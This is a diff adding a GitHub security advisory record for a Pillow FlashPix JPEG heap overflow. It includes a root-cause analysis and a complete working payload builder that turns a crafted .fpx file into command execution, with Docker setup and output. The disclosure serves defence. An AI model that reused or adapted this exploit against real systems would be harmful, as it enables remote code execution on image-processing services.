@@ -1,0 +1,167 @@
+{
+  "id": "GHSA-5x8w-8jj5-q52h",
+  "modified": "2026-10-23T22:00:04.735032509Z",
+  "published": "2026-10-23T21:55:21Z",
+  "aliases": [
+    "CVE-2026-112398"
+  ],
+  "summary": "Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution",
+  "details": "### Credits\n\n**Researcher**: Alex Bouffard (mixbo@pebwalker.com)\n\n### Summary\n\nA heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).\n\n### Details\n\n`FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.\n\n`Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.\n\nFor a JPEG-compressed subimage (`compression == 2`), the plugin builds a `\"jpeg\"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):\n\n```python\nMODES = {\n    ...\n    (0x00018000, 0x00017FFE): (\"RGBA\", \"LA\"),                # rawmode \"LA\"  (2 bytes/pixel)\n    ...\n    (0x00020000, 0x00020001, 0x00020002): (\"RGB\", \"YCC;P\"),  # rawmode \"YCC;P\"\n}\n```\n\nThe Imaging output buffer for the tile is sized for the rawmode (here `\"LA\"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):\n\n```c\nstate-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8;   // \"LA\" gives 2 * xsize bytes/row\n...\nstate-\u003ebuffer = (UINT8 *)calloc(1, state-\u003ebytes);\n```\n\nIn `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `\"LA\"` and `\"YCC;P\"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):\n\n```c\n/* Disable decoder conversions. */\ncontext-\u003ecinfo.jpeg_color_space = JCS_UNKNOWN;\ncontext-\u003ecinfo.out_color_space  = JCS_UNKNOWN;\n```\n\nUnder `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):\n\n```c\nok = jpeg_read_scanlines(\u0026context-\u003ecinfo, \u0026state-\u003ebuffer, 1);   // writes 4*W into a 2*W buffer\n```\n\nThis is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -\u003e tp_as_buffer -\u003e bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.\n\n### PoC\n\nTo facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).\n\nThe source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).\n\n`vulnerable.py` is the program under test, a one-liner that opens the file it is given:\n\n```python\n#!/usr/bin/env python3\n# The entire vulnerable operation an application performs on an untrusted file.\nimport sys\nfrom PIL import Image\n\nImage.open(sys.argv[1]).load()\n```\n\nThe payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:\n\n```console\n$ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx\n[control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0\n[control] opening it: vtable hijack -\u003e call *0x4206c0 with rdi -\u003e 'id'\n```\n\nThen open it with `vulnerable.py`:\n\n```console\n$ python3 vulnerable.py shell.fpx\nuid=0(root) gid=0(root) groups=0(root)\ncorrupted size vs. prev_size\n```\n\n`Image.open()` of the crafted file runs the baked command via `system(\"id\")`: command execution as the user running the image processing (root in the container).\n\nThe trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has\nalready run.\n\nThe builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.\n\n### Impact\n\nThis is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.\n\n### Annex A: Docker setup\n\nThe PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.\n\n**1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`\n([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:\n\n```dockerfile\nFROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54\nRUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n        ca-certificates \\\n        python3.12=3.12.3-1ubuntu0.13 python3.12-venv=3.12.3-1ubuntu0.13 \\\n    \u0026\u0026 rm -rf /var/lib/apt/lists/*\nRUN python3.12 -m venv /opt/v \\\n    \u0026\u0026 /opt/v/bin/pip install --no-cache-dir \"Pillow==12.2.0\" \"olefile==0.47\"\nENV PATH=/opt/v/bin:$PATH\nWORKDIR /poc\n# ASLR is an OS mitigation unrelated to the bug; disable it in-image for a deterministic heap.\nENTRYPOINT [\"setarch\", \"-R\"]\nCMD [\"bash\"]\n```\n\n```console\n$ docker build -t fjpeg1-poc .\n...\nDownloading pillow-12.2.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)\nSuccessfully installed Pillow-12.2.0 olefile-0.47\nSuccessfully built 370344c832b6\nSuccessfully tagged fjpeg1-poc:latest\n```\n\n**2. Start the (ASLR-disabled) container shell** with the scripts mounted:\n\n```sh\ndocker run --rm -it --security-opt seccomp=unconfined -v \"$PWD:/poc\" -w /poc fjpeg1-poc\n```\n\n### Annex B: payload builder source\n\n`make_payload.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).\nBuilds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -\u003e JCS_UNKNOWN\npath, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.\n  --crash      flood an adjacent ob_type with 0x42.. -\u003e SIGSEGV in PyBuffer_Release\n  (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -\u003e call *--target\nDefaults target the pinned Docker image with ASLR disabled (setarch -R). See --help.\"\"\"\nimport sys, io, struct, math, argparse\nfrom PIL import Image\n\nW, H = 65000, 2\nSECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748\nFREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF\nFPX_CLSID = bytes.fromhex(\"0067615654C1CE11855300AA00A1F95B\")\no32 = lambda v: struct.pack(\"\u003cI\", v)\np64 = lambda v: struct.pack(\"\u003cQ\", v)\nINV = bytes(255 - i for i in range(256))   # 8-bit inversion table\n\ndef jpeg(src):\n    b = io.BytesIO()\n    Image.frombytes(\"CMYK\", (W, H), bytes(src)).save(b, \"JPEG\", quality=100, subsampling=0)\n    return b.getvalue()\n\ndef decode_row(jpg):\n    # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits\n    # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R\n    # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The\n    # last decoded row is the one that lands in (and overflows past) the buffer.\n    px = Image.open(io.BytesIO(jpg)).tobytes()\n    return px[(H - 1) * W * 4:].translate(INV)\n\ndef craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -\u003e iterate to converge)\n    # base fill 0xBD -\u003e decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern\n    # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).\n    src = bytearray(b\"\\xbd\" * (W * H * 4)); base = (H - 1) * W * 4; it = 0\n    for off, t in targets:\n        for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v\n    for it in range(iters):\n        dec = decode_row(jpeg(src)); bad = 0\n        for off, t in targets:\n            for i, v in enumerate(t):\n                if dec[off + i] != v:\n                    bad += 1\n                    src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))\n        if not bad: break\n    return jpeg(src), it, bad\n\ndef maxid_for(w, h):\n    s, i = max(w, h), 1\n    while s \u003e 64: s //= 2; i += 1\n    return i - 1\nMAXID = maxid_for(W, H); RESNAME = \"Resolution %04d\" % MAXID\n\ndef image_contents():\n    ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b\n    cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -\u003e rawmode \"LA\"\n    props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID \u003c\u003c 16), blob(cb))]\n    voff = 8 + 8 * len(props); idx = vals = b\"\"\n    for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)\n    body = o32(len(props)) + idx + vals\n    return (struct.pack(\"\u003cHHI\", 0xFFFE, 0, 0x00020005) + b\"\\x00\" * 16 + o32(1) + b\"\\x00\" * 16\n            + o32(48) + o32(len(body) + 4) + body)\n\ndef subimage_header():\n    b = bytearray(80)\n    for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),\n                 (56, 36), (60, 16), (64, 0), (72, 2)]:\n        struct.pack_into(\"\u003cI\", b, o, v)\n    return bytes(b)\n\ndef build_fpx(jpg, out):\n    data = b\"\\x00\" * 28 + jpg\n    assert len(data) \u003c= DATA_PAD, (len(data), DATA_PAD)\n    pad = lambda x: x + b\"\\x00\" * ((-len(x)) % SECT)\n    sd = {\"ic\": pad(image_contents().ljust(4096, b\"\\x00\")),\n          \"hdr\": pad(subimage_header().ljust(4096, b\"\\x00\")),\n          \"dat\": pad(data.ljust(DATA_PAD, b\"\\x00\"))}\n    ns = lambda x: len(x) // SECT; order = [\"ic\", \"dat\", \"hdr\"]\n    dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)\n    fsec = 1\n    while fsec * 128 \u003c fsec + content: fsec += 1\n    pos = {}; cur = fsec; dstart = cur; cur += dsec\n    for k in order: pos[k] = cur; cur += ns(sd[k])\n    total = cur\n    fat = [FREESECT] * (fsec * 128)\n    for s in range(fsec): fat[s] = FATSECT\n    def chain(a, n):\n        for j in range(n): fat[a + j] = a + j + 1 if j \u003c n - 1 else ENDOFCHAIN\n    chain(dstart, dsec)\n    for k in order: chain(pos[k], ns(sd[k]))\n    def de(nm, t, ch, l, r, st, sz, cl=b\"\\x00\" * 16):\n        n = (nm.encode(\"utf-16-le\") + b\"\\x00\\x00\").ljust(64, b\"\\x00\")[:64]\n        return (n + struct.pack(\"\u003cHBB\", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)\n                + o32(ch) + cl + o32(0) + b\"\\x00\" * 16 + o32(st) + struct.pack(\"\u003cQ\", sz))\n    directory = pad(b\"\".join([\n        de(\"Root Entry\", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),\n        de(\"Data Object Store 000001\", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"\\x05Image Contents\", 2, NOSTREAM, NOSTREAM, 3, pos[\"ic\"], len(sd[\"ic\"])),\n        de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"Subimage 0000 Data\", 2, NOSTREAM, NOSTREAM, 5, pos[\"dat\"], len(sd[\"dat\"])),\n        de(\"Subimage 0000 Header\", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos[\"hdr\"], len(sd[\"hdr\"]))]))\n    h = bytearray(512); h[0:8] = bytes.fromhex(\"D0CF11E0A1B11AE1\")\n    for o, fmt, *v in [(24, \"\u003cHH\", 0x3E, 3), (28, \"\u003cH\", 0xFFFE), (30, \"\u003cHH\", 9, 6), (44, \"\u003cI\", fsec),\n                       (48, \"\u003cI\", dstart), (56, \"\u003cI\", 4096), (60, \"\u003cI\", ENDOFCHAIN), (68, \"\u003cI\", ENDOFCHAIN)]:\n        struct.pack_into(fmt, h, o, *v)\n    for i in range(109): struct.pack_into(\"\u003cI\", h, 76 + i * 4, i if i \u003c fsec else FREESECT)\n    secs = [b\"\"] * total\n    for s in range(fsec): secs[s] = b\"\".join(o32(x) for x in fat[s * 128:(s + 1) * 128])\n    for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]\n    for k in order:\n        for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]\n    open(out, \"wb\").write(bytes(h) + b\"\".join(secs))\n\ndef xhex(s): return int(s, 16)\n\nSYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"F-JPEG-1 .fpx payload builder (0-ASLR box)\")\n    ap.add_argument(\"--out\", required=True, help=\"output .fpx path\")\n    ap.add_argument(\"--crash\", action=\"store_true\",\n                    help=\"crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)\")\n    ap.add_argument(\"--heap-base\", type=xhex, default=0xbaa000,\n                    help=\"fixed heap base of the 0-ASLR box (default 0xbaa000)\")\n    ap.add_argument(\"--offset\", type=xhex, default=0x21e800,\n                    help=\"state-\u003ebuffer - heap_base (default 0x21e800 -\u003e S=0xdc8800)\")\n    ap.add_argument(\"--target\", type=xhex, default=SENTINEL,\n                    help=\"value called via the hijacked vtable; pass %#x (system@plt) for \"\n                         \"command execution (default is a sentinel for an RIP-control demo)\" % SYSTEM_PLT)\n    ap.add_argument(\"--cmd\", default=\"id\",\n                    help=\"command system() runs, written inline at obj+0 / rdi (\u003c=7 bytes, e.g. id, id;w)\")\n    a = ap.parse_args()\n\n    if a.crash:\n        # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD\n        # to make the decoded overflow bytes 0x42 -\u003e the adjacent ob_type becomes 0x4242424242424242.\n        build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)\n        print(\"[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 \"\n              \"-\u003e SIGSEGV in PyBuffer_Release (no addresses)\" % a.out)\n        return\n\n    if len(a.cmd.encode()) \u003e 7:\n        sys.exit(\"--cmd must be \u003c=7 bytes (it is written inline at obj+0, before ob_type)\")\n    S = a.heap_base + a.offset\n    A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET\n    tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),\n          (OB_TYPE_OFF - 8, a.cmd.encode() + b\"\\x00\")]      # obj+0 -\u003e rdi for system()\n    tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -\u003e spray B at +0xa0..+8\n    tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]\n    jpg, it, bad = craft(tg)\n    build_fpx(jpg, a.out)\n    print(\"[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d\"\n          % (a.out, S, a.target, a.cmd, it, bad))\n    print(\"[control] opening it: vtable hijack -\u003e call *%#x with rdi -\u003e %r\" % (a.target, a.cmd))\n\nif __name__ == \"__main__\":\n    main()\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "13.0.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "1.7.8",
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "12.3.0",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 12.3.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-5x8w-8jj5-q52h/GHSA-5x8w-8jj5-q52h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x8w-8jj5-q52h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112398"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/242a059aedc1935097d9aa1dc3f099750467ba75"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/13.0.0"
+    }
+  ]
+}
